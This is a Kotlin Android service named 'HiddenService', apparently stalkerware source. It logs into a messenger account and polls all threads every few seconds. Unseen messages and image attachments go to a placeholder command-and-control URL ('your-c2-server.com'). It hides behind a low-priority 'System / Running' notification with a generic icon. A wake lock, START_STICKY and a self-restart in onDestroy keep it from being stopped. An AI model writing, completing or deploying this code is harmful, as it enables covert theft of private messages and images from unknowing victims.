package com.monitor.messenger

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*

class HiddenService : Service() {

    private lateinit var messengerClient: MessengerClient
    private lateinit var exfiltrator: Exfiltrator
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        
        // Prevent service from being killed
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "MessengerMonitor:WakeLock"
        )
        wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes, re-acquired in loop
        
        // Initialize components
        exfiltrator = Exfiltrator("https://your-c2-server.com/api")
        messengerClient = MessengerClient(exfiltrator)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, createNotification())
        
        // Start the monitoring loop
        serviceScope.launch {
            monitor()
        }
        
        return START_STICKY // Restart if killed
    }

    private suspend fun monitor() {
        while (isActive) {
            try {
                // Step 1: Ensure logged in
                if (!messengerClient.isLoggedIn()) {
                    messengerClient.login()
                }
                
                // Step 2: Fetch inbox threads
                val threads = messengerClient.getThreads()
                
                // Step 3: For each thread, fetch recent messages
                for (thread in threads) {
                    val messages = messengerClient.getMessages(thread.id)
                    for (msg in messages) {
                        if (!msg.seen) {
                            exfiltrator.send("message", msg.toJson())
                            
                            // Download attachments if present
                            if (msg.hasImage) {
                                val imageData = messengerClient.downloadImage(msg.imageUrl)
                                exfiltrator.sendFile("image_${msg.id}.jpg", imageData)
                            }
                        }
                    }
                }
                
                // Step 4: Report online status
                exfiltrator.heartbeat()
                
                // Re-acquire wake lock
                wakeLock?.release()
                wakeLock?.acquire(10 * 60 * 1000L)
                
            } catch (e: Exception) {
                exfiltrator.send("error", mapOf("message" to e.message))
            }
            
            delay(POLL_INTERVAL_MS) // 2-5 seconds
        }
    }

    private fun createNotification(): Notification {
        val channelId = "messenger_monitor_channel"
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Services",
                NotificationManager.IMPORTANCE_MIN  // Minimal - no sound, no icon in status bar
            ).apply {
                description = "Background system services"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
        
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("System")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_info_details) // Generic system icon
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        serviceScope.cancel()
        wakeLock?.release()
        
        // Restart service
        val intent = Intent(this, HiddenService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        
        super.onDestroy()
    }

    companion object {
        private const val NOTIFICATION_ID = 1001
        private const val POLL_INTERVAL_MS = 3000L
    }
}
